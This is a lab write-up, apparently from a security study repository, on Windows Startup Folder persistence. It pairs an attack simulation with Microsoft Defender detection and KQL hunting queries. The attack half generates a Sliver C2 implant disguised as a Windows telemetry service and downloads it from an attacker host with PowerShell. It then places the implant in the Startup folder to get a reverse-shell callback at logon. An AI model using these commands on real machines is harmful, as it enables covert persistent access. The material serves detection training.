# Startup Folder Persistence
**Technique: [T1547.009 ‚Äì Shortcut Modification (Startup Folder)](https://attack.mitre.org/techniques/T1547/009/)**

The Startup folder is one of the oldest persistence tricks in the book, just drop an executable here, and it will run every time the user logs in.  

No special privileges required, no exploitation needed.

In this simulation, a payload is created and hosted using [Sliver C2](https://github.com/BishopFox/sliver), then manually placed in the user's Startup folder on the target host. [Microsoft Defender for Endpoint (MDE)](https://www.microsoft.com/en-us/security/business/threat-protection/microsoft-defender-endpoint) is left active to observe telemetry and detection behavior.  

> This test builds on the previous [Registry Run Key](https://github.com/j-manli/adversary-tradecraft-study/blob/main/03_persistence/autorun/T1547.001_runkey_C2_sliver.md) persistence simulation.
> Using the same payload, we now explore Startup Folder persistence.

## Host Configuration

- **Attacker VM:** `HR-COMPLAINTS` (Sliver C2 on Ubuntu 22.04)
  - **IP:** `10.1.0.51`
- **Target VM:** `CEO-LAPTOP` (Windows 10 with MDE onboarded)
  - **IP:** `10.1.0.69`
  - **Admin Username:** `TrustMeBro`

<summary><strong>üîπ Step 1: Generate and Host Payload (Attacker VM)</strong></summary>

&nbsp;

From `HR-COMPLAINTS`, we generate a Windows executable using [Sliver C2](https://github.com/BishopFox/sliver):

```
# Start Sliver
sudo sliver

# Inside Sliver console:
generate --os windows --format exe --name WindowsTelemetryService --http https://10.1.0.51
```

> `WindowsTelemetryService.exe` is a disguised payload name to blend in with legitimate telemetry binaries often found on Windows systems.

Next, host the payload via Python on port 80 (commonly allowed traffic):

```
sudo python3 -m http.server 80
```

<summary><strong>üîπ Step 2: Download Payload & Add to Startup Folder (Target VM)</strong></summary>

&nbsp;

From `CEO-LAPTOP`, use PowerShell to download the payload:

```powershell
wget "http://10.1.0.51/WindowsTelemetryService.exe" -OutFile "C:\ProgramData\WindowsTelemetryService.exe"
```

> ‚ÑπÔ∏è **Note:**  
> `C:\ProgramData` is a user-writable, trusted location often used by legitimate applications.  
> Because it doesn‚Äôt trigger alerts and doesn‚Äôt require elevated permissions, attackers frequently abuse this path for storing payloads discreetly.


Now copy the payload into the current user‚Äôs Startup folder:

```powershell
copy "C:\ProgramData\WindowsTelemetryService.exe" "C:\Users\TrustMeBro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsTelemetryService.exe"
```

> Dropping an executable into this folder ensures it runs at every user logon.

<summary><strong>üîπ Step 3: Reboot & Observe Callback</strong></summary>

&nbsp;

Sign out and back into the `TrustMeBro` user session on `CEO-LAPTOP`. Sliver should receive a callback, establishing a new session tied to the Startup Folder.

&nbsp;
We can verify the beacon using:

```
sessions
```

The above image also confirms our unique session ID, `efac7d6e`, and demonstrated code execution via the reverse shell by running `whoami`.

## Detection: Startup Folder Persistence  
**Technique: [T1547.009 ‚Äì Shortcut Modification: Startup Folder](https://attack.mitre.org/techniques/T1547/009/)**

> _‚ÄúFinding evil in the Startup Folder.‚Äù_

This analysis focuses on how Microsoft Defender for Endpoint (MDE) surfaced and confirmed persistence via the user-level Startup Folder. Instead of retracing all setup steps, we focus on the hunting process that answers: **Is something suspicious hiding on our system? If so, where did it come from?**

---

### Incident/Alert and Timeline Overview  

MDE surfaced the following:

- **Alert**: Uncommon file added to the startup folder, Suspected malware written in `Go`  
- **Severity**: `Medium`, `Low`  
- **Detection Source**: Defender for Endpoint (`EDR`), `Antivirus`
&nbsp;

<img width="1797" height="213" alt="startup_folder_incident_alert_timeline" src="https://github.com/user-attachments/assets/7ce5ba9c-8480-4236-a646-ebad6d5a3f11" />  
&nbsp;  

Digging into the Alert Timeline on `CEO-LAPTOP` revealed that:

- `WindowsTelemetryService.exe` was written to the Startup folder via PowerShell

> **NOTE:** Windows Defender on the host did a *really* good job of containing the malware, so I had to disable Defender to get it to work. 

---

### Hunting With KQL

Once we've identified the suspicious file, we can pivot on the file name and ask:  
> Was this file executed?

```kql
DeviceProcessEvents
| where FileName == "WindowsTelemetryService.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath, InitiatingProcessFolderPath
| sort by Timestamp desc
```

We see two launches: one from the registry test (ran previously), another from this Startup Folder test.  
Focusing on the Startup Folder, the output also shows `explorer.exe` as the parent process.  
Since this executable kicks off on login, this makes sense.

---

### Where Did it Come From and What is it Doing?

To answer this, a natural pivot might be to look at network events happening around the time of the observered alert to gain better context of what's happening.

```kql
DeviceNetworkEvents
| where DeviceName == "ceo-laptop"
| where Timestamp between (datetime(2025-07-13 02:30:00) .. datetime(2025-07-13 02:45:00))
| project Timestamp, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

<img width="1141" height="365" alt="network_connection_powershell_discovery_kql" src="https://github.com/user-attachments/assets/074555c6-9e06-444c-9bd1-f00a8611b137" />


The above image shows PowerShell connecting to an internal remote IP, `10.1.0.51` on `port 80`.
> Workstation to workstation communication is rare in most environments and worth investigating.

---

### Final Pivot: Attacker IP Activity

To verify callback activity:

```kql
DeviceNetworkEvents
| where DeviceName == "ceo-laptop"
| where RemoteIP == "10.1.0.51"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<img width="1699" height="629" alt="powershell_and_suspicious_process_remote_connection_kql" src="https://github.com/user-attachments/assets/c6257571-733e-42aa-8d59-c5522cc6e6ea" />


Confirmed: `WindowsTelemetryService.exe` initiated TCP connections after logon on `port 443`.
